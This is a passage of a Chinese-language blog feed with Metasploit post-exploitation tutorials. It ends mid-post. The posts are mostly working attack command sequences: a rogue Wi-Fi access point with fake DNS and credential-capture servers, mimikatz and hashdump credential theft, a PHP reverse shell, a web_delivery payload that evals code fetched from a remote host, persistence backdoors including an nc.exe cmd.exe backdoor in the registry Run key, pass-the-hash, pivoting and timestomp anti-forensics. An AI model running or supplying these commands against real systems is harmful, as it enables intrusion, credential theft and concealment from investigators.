auxiliary&#x2F;server&#x2F;capture&#x2F;pop3</span><br><span class="line">set SRVPORT 995</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;ftp</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;imap</span><br><span class="line">set SSL false</span><br><span class="line">set SRVPORT 143</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;imap</span><br><span class="line">set SSL true</span><br><span class="line">set SRVPORT 993</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;smtp</span><br><span class="line">set SSL false</span><br><span class="line">set SRVPORT 25</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;smtp</span><br><span class="line">set SSL true</span><br><span class="line">set SRVPORT 465</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;fakedns</span><br><span class="line">unset TARGETHOST</span><br><span class="line">set SRVPORT 5353</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;fakedns</span><br><span class="line">unset TARGETHOST</span><br><span class="line">set SRVPORT 53</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 80</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 8080</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 443</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 8443</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>安装其它依赖包</strong></p><pre><code>gem install activerecord sqlite3-ruby</code></pre><p><strong>基础架构安装配置</strong></p><pre><code>apt-get install isc-dhcp-server#dhcp配置修改cat /etc/dhcp/dhcpd.confoption domain-name-servers 10.0.0.1;default-lease-time 60;max-lease-time 72;ddns-update-style none;authoritative;log-facility local7;subnet 10.0.0.0 netmask 255.255.255.0 {range 10.0.0.100 10.0.0.254;option routers 10.0.0.1; option domain-name-servers 10.0.0.1;}</code></pre><h4 id="伪造AP"><a href="#伪造AP" class="headerlink" title="伪造AP"></a><strong>伪造AP</strong></h4><pre><code>airmon-ng start wlan0airbase-ng -P -C 30 -e &quot;FREE&quot; -v wlan0monifconfig at0 up 10.0.0.1 netmask 255.255.255.0touch /var/lib/dhcp/dhcpd.leases                #创建dhcp租约文件dhcpd -cf /etc/dhcp/dhcpd.conf at0</code></pre><p><strong>启动 Karmetasploit</strong></p><pre><code>msfconsole -q -r karma.rc_.txt</code></pre><ul><li>资源文件默认不允许用户上网,对实际场景几乎没有任何价值<ul><li>允许用户上网需要修改配置</li><li>删除setg参数</li><li>增加 browser_autopwn2等其它模块</li><li><code>use auxiliary/server/fakedns</code> DNS欺骗模块配置修改</li><li>检测恶意流量的模块: <code>auxiliary/vsploit/malware/dns*</code> <ul><li><code>vi karma.rc_.txt</code> 修改后如下:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;browser_autopwn</span><br><span class="line"></span><br><span class="line">set LHOST 10.0.0.1</span><br><span class="line">set SRVPORT 55550</span><br><span class="line">set URIPATH &#x2F;ads</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;browser_autopwn2</span><br><span class="line">set SRVPORT 55560</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;pop3</span><br><span class="line">set SRVPORT 110</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;pop3</span><br><span class="line">set SRVPORT 995</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;ftp</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;imap</span><br><span class="line">set SSL false</span><br><span class="line">set SRVPORT 143</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;imap</span><br><span class="line">set SSL true</span><br><span class="line">set SRVPORT 993</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;smtp</span><br><span class="line">set SSL false</span><br><span class="line">set SRVPORT 25</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;smtp</span><br><span class="line">set SSL true</span><br><span class="line">set SRVPORT 465</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;fakedns</span><br><span class="line">set TARGETACTION FAKE</span><br><span class="line">set TARGETDOMAIN www.taobao.com</span><br><span class="line">set TARGETHOST192.168.190.176</span><br><span class="line">set SRVPORT 53</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 80</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 8080</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 443</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 8443</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><p><strong>再次启动Karmetasploit</strong></p><pre><code>msfconsole -q -r karma.rc_.txt </code></pre><p><strong>添加路由和防火墙规则</strong></p><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forwardiptables -P FORWARD ACCEPTiptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</code></pre><ul><li>到此,使用Karmetasploit且让伪造AP能使用户上网的配置完成</li><li>当别人连接到伪造AP,就可以截获流量,并自动执行资源文件中的攻击动作,如果存在漏洞将自动获取shell</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> 伪造AP </tag>
            
            <tag> meterpreter </tag>
            
            <tag> airbase-ng </tag>
            
            <tag> 无线攻击 </tag>
            
            <tag> Karmetasploit </tag>
            
            <tag> dhcp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MsF后渗透测试阶段各种延伸用法</title>
      <link href="/2016/03/17/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E5%90%84%E7%A7%8D%E5%BB%B6%E4%BC%B8%E7%94%A8%E6%B3%95/"/>
      <url>/2016/03/17/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E5%90%84%E7%A7%8D%E5%BB%B6%E4%BC%B8%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h4 id="MsF延伸用法之Mimikatz"><a href="#MsF延伸用法之Mimikatz" class="headerlink" title="MsF延伸用法之Mimikatz"></a><strong>MsF延伸用法之Mimikatz</strong></h4><p><strong>hashdump 使用的就是mimikatz的部分功能</strong></p><pre><code>#meterpreterhashdumpgetsystem        #使用mimikatz需要先获取system权限load mimikatz    #加载mimikatzwdigest            #查看内存存储的明文密码信息kerberos        #查看内存存储的明文密码信息msv                #获取系统用户密码hash身份认证信息ssp                #获取明文的身份认证信息livessp            #获取明文的身份认证信息tspkg            #也是查看身份认证信息的命令#重点命令mimikatz_command -hmimikatz_command -f a::                    #加一个错误的模块名,可以当帮助使用mimikatz_command -f samdump::hashes            #获取samdump数据库的信息mimikatz_command -f handle::list            #查看系统进程mimikatz_command -f service::list            #查看系统服务mimikatz_command -f crypto::listProviders    #加密套件mimikatz_command -f winmine::infos            #扫雷作弊工具,纯属好玩的模块</code></pre><h4 id="PHP-shell"><a href="#PHP-shell" class="headerlink" title="PHP shell"></a><strong>PHP shell</strong></h4><pre><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=3333 -f raw -o a.php</code></pre><ul><li>MSF 启动侦听<ul><li>上传到web站点并通过浏览器访问,执行反弹shell</li></ul></li></ul><h4 id="Web-Delivery"><a href="#Web-Delivery" class="headerlink" title="Web Delivery"></a><strong>Web Delivery</strong></h4><ul><li>利用远程代码执行漏洞访问攻击者服务器  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery</span><br><span class="line">set target 1</span><br><span class="line">set URIPATH &#x2F;</span><br><span class="line">set lhost 192.168.190.178</span><br><span class="line">;php -d allow_url_fopen&#x3D;true -r “eval(file_get_contents(‘http:&#x2F;&#x2F;1.1.1.1&#x2F;fTYWqmu&#39;));&quot;</span><br></pre></td></tr></table></figure></li></ul><h4 id="RFI-远程文件包含"><a href="#RFI-远程文件包含" class="headerlink" title="RFI 远程文件包含"></a><strong>RFI 远程文件包含</strong></h4><pre><code>vi /etc/php5/cgi/php.ini        #php info 配置文件    allow_url_fopen = On    allow_url_include = On</code></pre><ul><li>使用php_include远程文件包含漏洞MSF模块  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;unix&#x2F;webapp&#x2F;php_include</span><br><span class="line">set RHOST 1.1.1.2</span><br><span class="line">set PATH &#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;</span><br><span class="line">set PHPURI &#x2F;?page&#x3D;XXpathXX</span><br><span class="line">set HEADERS &quot;Cookie:security&#x3D;low;PHPSESSID&#x3D;eefcf023ba61219d4745ad7487fe81d7&quot;</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 1.1.1.1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> mimikatz </tag>
            
            <tag> meterpreter </tag>
            
            <tag> 后门持久化 </tag>
            
            <tag> hashdump </tag>
            
            <tag> 远程文件包含 </tag>
            
            <tag> 远程代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MsF后渗透测试阶段之后门持久化</title>
      <link href="/2016/03/16/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96/"/>
      <url>/2016/03/16/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h4 id="持久后门"><a href="#持久后门" class="headerlink" title="持久后门"></a><strong>持久后门</strong></h4><ul><li>利用漏洞取得的meterpreter shell 运行于内存中,重启失效</li><li>重复 exploit 漏洞可能造成服务崩溃</li><li>持久后门保证漏洞修复后仍可远程控制</li></ul><ol><li><p><strong>Meterpreter脚本实现的正向持久后门</strong> - 缺点是别人发现了该端口都可以连</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run metsvc -A#删除 -r,安装并启动metsvc服务,默认31337端口</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set PAYLOAD windows&#x2F;metsvc_bind_tcp#使用metsvc payload模块连接</span><br><span class="line">set LPORT 31337</span><br><span class="line">set RHOST 1.1.1.1</span><br></pre></td></tr></table></figure></li><li><p><strong>Meterpreter脚本实现的反弹持久后门</strong></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">run persistence -h</span><br><span class="line">run persistence -X -i 10 -p 4444 -r 1.1.1.1#写入脚本和注册表启动项启动</span><br><span class="line">background</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 1.1.1.1</span><br><span class="line">set lport 4444</span><br><span class="line">set exitonsession false#持续侦听端口配置参数</span><br><span class="line">exploit -j -z</span><br><span class="line"></span><br><span class="line">#其它两个参数</span><br><span class="line">run persistence -U -i 20 -p 4444 -r 1.1.1.1</span><br><span class="line">run persistence -S -i 20 -p 4444 -r 1.1.1.1#-S 服务启动</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> meterpreter </tag>
            
            <tag> metsvc </tag>
            
            <tag> persistence </tag>
            
            <tag> 后门持久化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MsF后渗透测试阶段之meterpreter脚本及post模块</title>
      <link href="/2016/03/15/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8Bmeterpreter%E8%84%9A%E6%9C%AC%E5%8F%8Apost%E6%A8%A1%E5%9D%97/"/>
      <url>/2016/03/15/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8Bmeterpreter%E8%84%9A%E6%9C%AC%E5%8F%8Apost%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h4 id="POST-模块-在已经取得meterpreter之后使用的模块"><a href="#POST-模块-在已经取得meterpreter之后使用的模块" class="headerlink" title="POST 模块(在已经取得meterpreter之后使用的模块)"></a><strong>POST 模块</strong>(在已经取得meterpreter之后使用的模块)</h4><p><strong>获取meterpreter</strong></p><pre><code>use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 1.1.1.1set exitonsession false        #持续侦听端口配置参数exploit -j -z</code></pre><p><strong>常用POST模块</strong>    </p><pre><code>#在meterpreter下输入run按tab键会提示有大量POST模块和脚本run post/windows/gather/arp_scanner RHOSTS=2.1.1.0/24    #扫描目标网段run post/windows/gather/checkvm        #检查是否为虚拟机run post/windows/gather/credentials/credential_collector    #获取目标机器账号等身份认证信息run post/windows/gather/enum_applications        #获取目标机器安装的应用程序run post/windows/gather/enum_logged_on_users    #获取目标系统正在登录中的账号run post/windows/gather/enum_snmp                #查看目标系统是否开启snmp服务run post/multi/recon/local_exploit_suggester    #获取目标系统可用来本地提权的漏洞信息run post/windows/manage/delete_user USERNAME=yuanfh        #删除目标系统账号run post/multi/gather/env                #获取目标系统一些敏感信息run post/multi/gather/firefox_creds        #收集firefox浏览器保存的密码信息run post/multi/gather/ssh_creds            #获取本地保存的SSH身份验证信息,适用linuxrun post/multi/gather/check_malware REMOTEFILE=c:\\a.exe    #检查目标系统的某个程序是否为恶意程序</code></pre><h4 id="另一种运行POST模块的方法"><a href="#另一种运行POST模块的方法" class="headerlink" title="另一种运行POST模块的方法"></a><strong>另一种运行POST模块的方法</strong></h4><p><strong>自动执行meterpreter脚本</strong></p><pre><code>show advanced        #显示高级设置参数set AutoRunScript hostsedit -e 1.1.1.1,www.baidu.com    #进入meterpreter自动修改hosts文件set InitialAutoRunScript checkvm</code></pre><p><strong>利用高级设置参数自动执行POST模块</strong></p><pre><code>set InitialAutoRunScript migrate -n explorer.exe    #需先设置迁移目标用户权限的进程set AutoRunScript post/windows/gather/dumplinks        #再设置获取最近打开文档路径</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> dumplinks </tag>
            
            <tag> hosts编辑 </tag>
            
            <tag> meterpreter </tag>
            
            <tag> 迁移进程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MsF后渗透测试阶段之跳板利用及端口转发</title>
      <link href="/2016/03/14/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E8%B7%B3%E6%9D%BF%E5%88%A9%E7%94%A8%E5%8F%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
      <url>/2016/03/14/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E8%B7%B3%E6%9D%BF%E5%88%A9%E7%94%A8%E5%8F%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h4 id="Pivoting-跳板-枢纽-支点"><a href="#Pivoting-跳板-枢纽-支点" class="headerlink" title="Pivoting 跳板 / 枢纽 / 支点"></a><strong>Pivoting</strong> 跳板 / 枢纽 / 支点</h4><ul><li>利用已经控制的一台计算机作为入侵内网的跳板</li><li>在其他内网计算机看来访问全部来自于跳板机</li><li><code>run autoroute -s 1.1.1.0/24</code><br>  #不能访问外网的被攻击目标内网网段</li></ul><p><strong>自动路由 现实场景</strong></p><ul><li>利用win 7攻击内网XP(对比xp有无外网访问权的情况)</li><li>扫描内网辅助模块: <code>auxiliary/scanner/portscan/tcp</code></li></ul><pre><code>use auxiliary/scanner/portscan/tcpshow optionsset rhosts 2.1.1.0/24set ports 139,445exploitdb_nmap -sV -p 445 2.1.1.11use exploit/windows/smb/ms08_067_netapishow optionsset rhost 2.1.1.11        #设置目标内网被攻击IPset payload windows/meterpreter/reverse_tcpset lhost 2.1.1.10        #设置反弹连接IP为跳板机set target 34</code></pre><p><strong>Pivoting之端口转发Portfwd</strong></p><ul><li>利用已经被控计算机,在kali与被攻击目标之间实现端口转发</li><li>也需要在已有session的前提下进入meterpreter内使用  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -L LIP -l LPORT -r RIP -p RPORT#添加端口转发规则</span><br><span class="line">portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389</span><br><span class="line">portfwd list #查看已添加列表</span><br><span class="line">portfwd delete#删除某条规则</span><br><span class="line">portfwd flush#删除全部规则</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> meterpreter </tag>
            
            <tag> 跳板机 </tag>
            
            <tag> portfwd </tag>
            
            <tag> autoroute </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MsF后渗透测试阶段之抓包及MACE时间修改</title>
      <link href="/2016/03/13/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%8A%93%E5%8C%85%E5%8F%8AMACE%E6%97%B6%E9%97%B4%E4%BF%AE%E6%94%B9/"/>
      <url>/2016/03/13/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%8A%93%E5%8C%85%E5%8F%8AMACE%E6%97%B6%E9%97%B4%E4%BF%AE%E6%94%B9/</url>
      
        <content type="html"><![CDATA[<p><strong>抓包</strong>(meterpreter)</p><pre><code>load sniffersniffer_interfacessniffer_start 2sniffer_dump 2 1.cap / sniffer_dump 2 1.cap</code></pre><ul><li>在内存中缓存区块循环存储抓包(50000包),不写磁盘</li><li>智能过滤meterpreter流量,传输全程使用SSL/TLS加密</li></ul><p><strong>解码</strong></p><pre><code>use auxiliary/sniffer/psnuffleset PCAPFILE /root/1.cap</code></pre><p><strong>搜索文件</strong><br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search -f *.ini</span><br><span class="line">search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.docx</span><br></pre></td></tr></table></figure></p><h4 id="John-the-Ripper-破解弱口令"><a href="#John-the-Ripper-破解弱口令" class="headerlink" title="John the Ripper 破解弱口令"></a><strong>John the Ripper 破解弱口令</strong></h4><pre><code>use post/windows/gather/hashdump        #system权限的meterpreterrun        #结果保存在/tmp目录下use auxiliary/analyze/jtr_crack_fastrun</code></pre><ul><li>文件系统访问会留下痕迹,电子取证重点关注</li><li>渗透测试和攻击者往往希望销毁文件系统访问痕迹</li><li>最好的避免被电子取证发现的方法:不要碰文件系统<ul><li>meterpreter的先天优势所在(完全基于内存)</li></ul></li></ul><p><strong>MAC时间</strong>(Modified Accessed Changed)</p><pre><code>ls -l --time=atime/mtime/ctime 1.txt    #查看MAC时间stat 1.txt                                #查看MAC时间touch -d &quot;2 days ago&quot; 1.txt                #修改MAC时间touch -t 1501010101 1.txt                #修改MAC时间</code></pre><ul><li>MACE:MFT entry<ul><li>MFT:NTFS文件系统的主文件分配表Master File Table</li><li>通常1024字节或2个硬盘扇区,其中存放多项entry信息</li><li>包含文件大量信息(大小,名称,目录位置,硬盘位置,创建日期)</li><li>更多信息可研究文件系统取证分析技术</li></ul></li></ul><p><strong>Timestomp</strong>(meterpreter)</p><pre><code>timestomp -v 1.txttimestomp -f c:\\autoexec.bat 1.txt        #指定一个文件模板改时间-b -r        #擦除MACE时间信息,目前此参数功能失效-m / -a / -c / -e / -z        #单独修改时间参数timestomp -z &quot;MM/DD/YYYY HH24:MI:SS&quot; 2.txt        #统一修改所有时间</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> John </tag>
            
            <tag> meterpreter </tag>
            
            <tag> sniffer </tag>
            
            <tag> MACE时间修改 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MsF后渗透测试阶段之注册表修改</title>
      <link href="/2016/03/13/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%BF%AE%E6%94%B9/"/>
      <url>/2016/03/13/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%BF%AE%E6%94%B9/</url>
      
        <content type="html"><![CDATA[<p><strong>注册表保存着windows几乎全部配置参数</strong></p><ul><li>如果修改不当,可直接造成系统崩溃</li><li>修改前完整备份注册表</li><li>某些注册表的修改是不可逆的</li></ul><p><strong>常见用途</strong></p><ul><li>修改,增加启动项</li><li>窃取存储于注册表中的机密信息</li><li>绕过文件型病毒查杀</li></ul><h4 id="用注册表添加NC后门服务-meterpreter"><a href="#用注册表添加NC后门服务-meterpreter" class="headerlink" title="用注册表添加NC后门服务(meterpreter)"></a><strong>用注册表添加NC后门服务</strong>(meterpreter)</h4><pre><code>#上传NC工具到目标Windowsupload /usr/share/windows-binaries/nc.exe C:\\windows\\system32#使用reg子命令查询注册表键值reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run#增加nc子键值并配置nc正向连接参数,-d 静默执行 -L断开连接后不关闭端口reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &apos;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&apos;#查询是否添加成功reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</code></pre><p><strong>打开防火墙端口</strong>(meterpreter)</p><pre><code>execute -f cmd -i -H    #进入交互式SHELLnetsh firewall show opmode    #查询防火墙状态netsh firewall add portopening TCP 444 &quot;test&quot; ENABLE ALL    #添加一条test规则并启动shutdown -r -t 0nc 1.1.1.1 444</code></pre><p><strong>其它注册表项</strong></p><pre><code>`https://support.accessdata.com/hc/en-us/articles/204448155-RegistryQuick-Find-Chart`</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> nc </tag>
            
            <tag> meterpreter </tag>
            
            <tag> 注册表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MsF后渗透测试阶段之常用操作</title>
      <link href="/2016/03/11/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"/>
      <url>/2016/03/11/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p><strong>meterpreter</strong></p><pre><code>load privhashdump</code></pre><h4 id="Psexec-模块之Passthehash"><a href="#Psexec-模块之Passthehash" class="headerlink" title="Psexec 模块之Passthehash"></a><strong>Psexec 模块之Passthehash</strong></h4><ul><li><p><strong>利用hash直接登录目标windows系统</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec</span><br><span class="line">set smbuser cat</span><br><span class="line">set smbpass hash</span><br><span class="line">set rhost 192.168.254.110</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.190.137</span><br></pre></td></tr></table></figure></li><li><p><strong>需要提前关闭UAC</strong> (meterpreter下依次执行以下指令)</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 